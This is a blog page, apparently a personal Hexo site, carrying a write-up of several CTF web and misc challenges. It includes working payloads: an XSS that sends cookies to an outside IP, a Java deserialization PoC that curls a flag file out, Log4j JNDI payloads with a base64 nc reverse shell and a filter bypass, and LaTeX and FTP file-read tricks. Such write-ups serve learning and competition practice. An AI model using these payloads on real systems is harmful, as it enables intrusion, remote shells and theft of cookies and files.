@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="securinets-CTF">
+<meta property="og:url" content="http://example.com/2022/04/11/securites/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411121534123.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210307931.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210547459.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210723985.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210806550.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210910054.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410212313201.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411092558060.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411092845642.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411114006671.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411115758942.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411115837865.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411142311563.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411142338046.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410191149698.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410191234593.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410191507712.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410191545112.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410192042663.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410192213167.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220408203819334.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220408214545349.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220408235736621.png">
+<meta property="article:published_time" content="2022-04-11T12:35:04.259Z">
+<meta property="article:modified_time" content="2022-04-11T12:34:58.538Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411121534123.png">
+
+<link rel="canonical" href="http://example.com/2022/04/11/securites/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>securinets-CTF | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">165</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/11/securites/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          securinets-CTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-11 20:35:04 / 修改时间：20:34:58" itemprop="dateCreated datePublished" datetime="2022-04-11T20:35:04+08:00">2022-04-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411121534123.png" alt="image-20220411121534123"></p>
+<a id="more"></a>
+
+<h1 id="Document-Converter"><a href="#Document-Converter" class="headerlink" title="Document-Converter"></a>Document-Converter</h1><ul>
+<li>libreOffice</li>
+<li>PDF</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://10nf0x.medium.com/egctf-2019-final-secure-document-portal-v2-70c1e23110f3">https://10nf0x.medium.com/egctf-2019-final-secure-document-portal-v2-70c1e23110f3</a></p>
+<p><a target="_blank" rel="noopener" href="https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/">https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/</a></p>
+<p>libreOffice 漏洞，题目是可以上传doc、jpg、gif，转为pdf，根据文章操作即可</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210307931.png" alt="image-20220410210307931"></p>
+<p>插入OLE对象，这里需要文件存在，linux机器不用这样，直接/flag即可</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210547459.png" alt="image-20220410210547459"></p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210723985.png" alt="image-20220410210723985"></p>
+<p>保存为odt，然后改名为doc</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210806550.png" alt="image-20220410210806550"></p>
+<p>用压缩软件打开，修改url为file协议</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410210910054.png" alt="image-20220410210910054"></p>
+<p>然后发现只能读两三行，作者也给了payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;text:section text:name&#x3D;&quot;string&quot;&gt;</span><br><span class="line">&lt;text:section-source xlink:href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;flag&quot; xlink:type&#x3D;&quot;simple&quot; xlink:show&#x3D;&quot;embed&quot; xlink:actuate&#x3D;&quot;onLoad&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;text:section&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410212313201.png" alt="image-20220410212313201"></p>
+<p>Securinets{1t_was_So_easy!!!}</p>
+<h1 id="planetsheet"><a href="#planetsheet" class="headerlink" title="planetsheet"></a>planetsheet</h1><ul>
+<li>XSLT</li>
+<li>XSS</li>
+</ul>
+<p>题目为xss类型，有报告页面</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411092558060.png" alt="image-20220411092558060"></p>
+<p>然后测试的时候发现页面不对劲，不是正常的html，然后通过搜索关键字xsl，发现使用了一种xslt的技术，将xml转为了xhtml</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411092845642.png" alt="image-20220411092845642"></p>
+<p>然后我搜索了相关不同 Content-Type 下的xss注入</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BlackFan/content-type-research/blob/master/XSS.md">https://github.com/BlackFan/content-type-research/blob/master/XSS.md</a></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;x:script xmlns:x&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;window.open(&#39;http:&#x2F;&#x2F;1.116.110.61:4000&#39;+document.cookie)&lt;&#x2F;x:script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="BrokenParr0t"><a href="#BrokenParr0t" class="headerlink" title="BrokenParr0t"></a>BrokenParr0t</h1><ul>
+<li>gadgetinspector</li>
+</ul>
+<p>一道java反序列化题目，直接jd-gui分析或者在线网站 <a target="_blank" rel="noopener" href="https://jdec.app/">https://jdec.app/</a></p>
+<p>这里对cookie进行base64解码然后存在反序列化操作，这里有一点不理解(Question)</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411114006671.png" alt="image-20220411114006671"></p>
+<p>在utils.QuestionCompar对internal再次进行base64解码，然后compare函数中存在反序列化操作</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411115758942.png" alt="image-20220411115758942"></p>
+<p>最后走到services.Author，控制使uuid的hashCode为0，就可代码执行</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411115837865.png" alt="image-20220411115837865"></p>
+<p>也就是说要让 <strong>(Question)inp.readObject();</strong> 走到QuestionCompar中并且调用compare方法，CC2链中使用<strong>PriorityQueue</strong></p>
+<p>调用<strong>任意的compare</strong>方法</p>
+<p>poc</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.securinets.services.Author;</span><br><span class="line"><span class="keyword">import</span> com.securinets.utils.QuestionCompar;</span><br><span class="line"><span class="keyword">import</span> java.io.* ;</span><br><span class="line"><span class="keyword">import</span> java.util.* ;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exploit</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Author author = <span class="keyword">new</span> Author();</span><br><span class="line">        <span class="comment">//设置字段</span></span><br><span class="line">        setFieldValue(author,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;curl http://1.116.110.61:4000/ -d @/flag.txt&quot;</span>);</span><br><span class="line">        setFieldValue(author,<span class="string">&quot;uuid&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(author);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="comment">//生成base64，用于二次decode</span></span><br><span class="line">        String evilcode = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line"></span><br><span class="line">        QuestionCompar questionCompar = <span class="keyword">new</span> QuestionCompar();</span><br><span class="line">        setFieldValue(questionCompar,<span class="string">&quot;internal&quot;</span>,evilcode);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,questionCompar);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>FLAG: Securinets{DouBlE_SeRiaLisAtion_AnD_J4Va_S0_Ann0yInG}</p>
+<p>gadgetinspector 它是 Netflix 安全团队用于查找小工具链的 Java 字节码分析工具。它在白盒攻击中很有用，找链子的工具</p>
+<h1 id="NarutoKeeper"><a href="#NarutoKeeper" class="headerlink" title="NarutoKeeper"></a>NarutoKeeper</h1><ul>
+<li>XSLeak</li>
+</ul>
+<p>题目注册登录后有添加文章功能与模糊搜索功能与报告功能，flag在admin账户下的文章里，向admin报告vps上的evil html执行js代码，去使用搜索功能，逐个字符的控制，判断状态码，返回302，就是flag，然后再将数据外带</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411142311563.png" alt="image-20220411142311563"></p>
+<p>flag的下一个字符为正确</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220411142338046.png" alt="image-20220411142338046"></p>
+<p>具体代码，不会写…</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>misc有几道log4j的bypass，第三道没有出，回头再补，感觉就是利用其他的两种方式，但是打了几次没回显</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peace-and-romance/p/15717457.html">https://www.cnblogs.com/peace-and-romance/p/15717457.html</a></p>
+<p>When I open the attachment,i found log4j</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410191149698.png" alt="image-20220410191149698"></p>
+<p>Under login routing，Trigger log4j by username</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410191234593.png" alt="image-20220410191234593"></p>
+<p>so i try it by dnslog</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;sl155b.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410191507712.png" alt="image-20220410191507712"></p>
+<p>Received an echo</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410191545112.png" alt="image-20220410191545112"></p>
+<p>so  I Generate payload as usual</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 150.158.181.145</span><br></pre></td></tr></table></figure>
+
+<p>using command for reverse shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;base64 code means reverse shell by using nc cmmand</span><br><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;150.158.181.145:1389&#x2F;Basic&#x2F;Command&#x2F;Base64&#x2F;bmMgMS4xMTYuMTEwLjYxIDQwMDAgLWUgL2Jpbi9zaA&#x3D;&#x3D;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>my vps recived and auto sending some payload</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410192042663.png" alt="image-20220410192042663"></p>
+<p>Then nc my port for recive shell</p>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220410192213167.png" alt="image-20220410192213167"></p>
+<p>misc2 add some filter,i using this payload to bypass it</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;env:TEST:-j&#125;ndi$&#123;env:TEST:-:&#125;$&#123;env:TEST:-l&#125;dap$&#123;env:TEST:-:&#125;&#x2F;&#x2F;150.158.181.145:1389&#x2F;Basic&#x2F;Command&#x2F;Base64&#x2F;(base64 code)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220408203819334.png" alt="image-20220408203819334"></p>
+<h1 id="sourcer"><a href="#sourcer" class="headerlink" title="sourcer"></a>sourcer</h1><blockquote>
+<p>Hey, I’ve built a tool to view source code. Is it secure?</p>
+</blockquote>
+<p>获取源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Challenge by @gehaxelt.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showcode</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$source</span> = show_source(<span class="variable">$file</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>])) &#123;</span><br><span class="line">    showcode(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(str_contains(<span class="variable">$file</span>, <span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No automated tools pls.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$file</span> . FLAG . <span class="string">&quot;.php&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;File not found :-/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    showcode(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>太明显了，file_exists去访问ftp，然后就将flag泄露了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;vps开启ftp</span><br><span class="line">python3 -m pyftpdlib -p 21</span><br><span class="line">&#x2F;&#x2F;payload</span><br><span class="line">?file&#x3D;ftp:&#x2F;&#x2F;1.116.110.61:21&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220408214545349.png" alt="image-20220408214545349"></p>
+<p>FLAG: ENO{F1L3_Exists_FTP_fun_in_PHP}</p>
+<h1 id="Texnology"><a href="#Texnology" class="headerlink" title="Texnology"></a>Texnology</h1><blockquote>
+<p>Online LaTeX editors are quite famous now, but are the associated risks as well?</p>
+<p>Hint: The flag is at /FLAG.</p>
+</blockquote>
+<p>latex生成pdf文件，存在黑名单，找个读取的payload进行读取，但是这里貌似存在了非预期，没有控制大小写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\newread\file</span><br><span class="line">\openin\file&#x3D;&#x2F;FLAg</span><br><span class="line">\loop\unless\ifeof\file</span><br><span class="line">    \read\file to\fileline </span><br><span class="line">    \text&#123;\fileline&#125;</span><br><span class="line">\repeat</span><br><span class="line">\closein\file</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/securinets/image-20220408235736621.png" alt="image-20220408235736621"></p>
+<p>在生成的pdf中发现flag</p>
+<p>FLAG：ENO{L4T3x_H4ck1Ng_R3L04D3D_OK!}</p>
+<h1 id="Texnology-Fixed"><a href="#Texnology-Fixed" class="headerlink" title="Texnology (Fixed)"></a>Texnology (Fixed)</h1><p>绕就完事了，def定义，然后变量拼接</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\def \fl &#123;&#x2F;FL&#125;</span><br><span class="line">\def \ag &#123;AG.php&#125;</span><br><span class="line">\def \arg &#123;\fl\ag&#125;</span><br><span class="line">\arg</span><br><span class="line">\newread\file</span><br><span class="line">\openin\file&#x3D;\arg</span><br><span class="line">\loop\unless\ifeof\file</span><br><span class="line">    \read\file to\fileline </span><br><span class="line">    \fileline</span><br><span class="line">\repeat</span><br><span class="line">\closein\file</span><br></pre></td></tr></table></figure>
+
+<p>FLAG: ENO{L4T3x_H4ck1Ng_R3L04D3D_OK_N0t_BugGy_!}</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/02/Fastjson(%E4%BA%8C)/" rel="prev" title="Fastjson 1.2.25-1.2.47">
+      <i class="fa fa-chevron-left"></i> Fastjson 1.2.25-1.2.47
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Document-Converter"><span class="nav-number">1.</span> <span class="nav-text">Document-Converter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#planetsheet"><span class="nav-number">2.</span> <span class="nav-text">planetsheet</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BrokenParr0t"><span class="nav-number">3.</span> <span class="nav-text">BrokenParr0t</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NarutoKeeper"><span class="nav-number">4.</span> <span class="nav-text">NarutoKeeper</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">5.</span> <span class="nav-text">MISC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sourcer"><span class="nav-number">6.</span> <span class="nav-text">sourcer</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Texnology"><span class="nav-number">7.</span> <span class="nav-text">Texnology</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Texnology-Fixed"><span class="nav-number">8.</span> <span class="nav-text">Texnology (Fixed)</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">165</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">分类</span></a>
